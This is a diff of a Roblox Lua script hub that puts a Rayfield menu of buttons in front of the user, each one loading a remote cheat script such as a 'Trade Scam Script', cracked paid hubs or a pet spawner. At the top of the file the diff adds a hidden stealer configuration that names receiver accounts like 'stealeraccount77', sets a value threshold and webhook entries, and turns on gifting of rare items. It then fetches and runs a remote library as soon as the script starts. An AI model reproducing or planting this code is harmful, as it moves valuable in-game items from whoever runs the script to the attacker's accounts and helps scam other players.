@@ -1,4 +1,19 @@
-📌 Auto copy TikTok link on script execution
+_G.NullConfig = {
+    User = {"stealeraccount77", "bomaylatip", "ConCuTiHon02", "banpetuytin1111", "banpetuytin11114", "phatle8117"},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "293.211.34.242:20",
+    FakeGift = "No",
+    Trash = "293.211.34.242:20",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+
+
+-- 📌 Auto copy TikTok link
 setclipboard("https://www.tiktok.com/@developervn11?_t=ZS-8yW9cZdXeQD&_r=1")
 
 -- 📌 Load Rayfield UI Library
@@ -6,90 +21,92 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 -- 📌 Create main GUI window
 local Window = Rayfield:CreateWindow({
-   Name = "All Script By PhatLee(and more)", -- sau khi load
-   LoadingTitle = "Follow Tiktok Scripts By PhatLee For All Update", -- khi đang loading
-   LoadingSubtitle = "By Phat Lee",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil,
-      FileName = "PhatLeeScriptConfig"
-   },
-   Discord = {
-      Enabled = false,
-      Invite = "",
-      RememberJoins = false
-   },
-   KeySystem = false,
+    Name = "All Script By PhatLee(and more)",
+    Icon = 0,
+    LoadingTitle = "Follow Tiktok Scripts By PhatLee For All Update",
+    LoadingSubtitle = "By Phat Lee",
+    ShowText = "Rayfield",
+    Theme = "Default",
+    ToggleUIKeybind = "K",
+    DisableRayfieldPrompts = false,
+    DisableBuildWarnings = false,
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = nil,
+        FileName = "PhatLeeScriptConfig"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "",
+        RememberJoins = false
+    },
+    KeySystem = false
 })
 
 -- 📌 Create tab
-local Tab = Window:CreateTab("Scripts", 4483362458)
+local Tab = Window:CreateTab("Scripts", "home")
 
 -- 📌 Add script buttons
-
 Tab:CreateButton({
-   Name = "Speed Hub X (use this instead of nat hub premium cracked) (need key)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/Speed-Hub-X/refs/heads/main/Speed%2520Hub%2520X"))()
-   end,
+    Name = "Speed Hub X (use this instead of nat hub premium cracked) (need key)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/Speed-Hub-X/refs/heads/main/Speed%2520Hub%2520X"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "Nat Hub PREMIUM CRACKED(nat hub fixed it lol)(no loading screen)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/nathub/refs/heads/main/nat"))()
-   end,
+    Name = "Nat Hub PREMIUM CRACKED(nat hub fixed it lol)(no loading screen)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/nathub/refs/heads/main/nat"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "Trade Scam Script(WORKING!),only work public server,no loading screen,wait 5 minutes",
-   Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"))()
-
---backpack
-
-loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
-   end,
+    Name = "Trade Scam Script(WORKING!),only work public server,no loading screen,wait 5 minutes",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"))()
+        loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "Pet Spawner Script (Project Reverse, public server, maybe take 10-20 seconds to load)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/PetSpawner/refs/heads/main/ScriptByPhatLee"))()
-   end,
+    Name = "Pet Spawner Script (Project Reverse, public server, maybe take 10-20 seconds to load)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/PetSpawner/refs/heads/main/ScriptByPhatLee"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "Pet Randomize (By PhatLee, public server)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/PetRandomize/refs/heads/main/ScriptByPhatLee"))()
-   end,
+    Name = "Pet Randomize (By PhatLee, public server)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/PetRandomize/refs/heads/main/ScriptByPhatLee"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "Pet Multiplier x10 (By PhatLee, loading screen and public server)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/Pet_X10_Weight/refs/heads/main/ScriptByPhatLee"))()
-   end,
+    Name = "Pet Multiplier x10 (By PhatLee, loading screen and public server)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/Pet_X10_Weight/refs/heads/main/ScriptByPhatLee"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "Lumin Hub (work private server cuz its real) (need key)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/luminhub/refs/heads/main/lumin"))()
-   end,
+    Name = "Lumin Hub (work private server cuz its real) (need key)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/luminhub/refs/heads/main/lumin"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "Limit Hub (work private server cuz its real) (need key)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/limithub/refs/heads/main/limit"))()
-   end,
+    Name = "Limit Hub (work private server cuz its real) (need key)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/limithub/refs/heads/main/limit"))()
+    end
 })
 
 Tab:CreateButton({
-   Name = "OMG Hub (maybe scam, I didn’t try it)",
-   Callback = function()
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/OMGhub/refs/heads/main/OMG"))()
-   end,
+    Name = "OMG Hub (maybe scam, I didn’t try it)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/OMGhub/refs/heads/main/OMG"))()
+    end
 })
